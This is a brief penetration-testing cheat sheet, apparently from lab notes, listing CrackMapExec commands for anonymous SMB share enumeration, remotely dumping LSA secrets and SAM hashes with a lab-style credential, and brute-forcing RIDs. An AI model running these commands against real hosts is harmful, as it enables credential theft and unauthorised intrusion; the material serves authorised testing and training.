**OUTDATED!** Newer one is [[nxc]]
```bash
$ crackmapexec smb <IP> --shares -u '' -p ''
```

## Dump LSA/SAM Remotely
```shell-session
$ crackmapexec smb <IP> --local-auth -u bob -p HTB_@cademy_stdnt! --<lsa/sam>
```

## Bruteforce RIDs
```shell-session
$ crackmapexec smb <IP> -u 'guest' -p '' --rid-brute
```
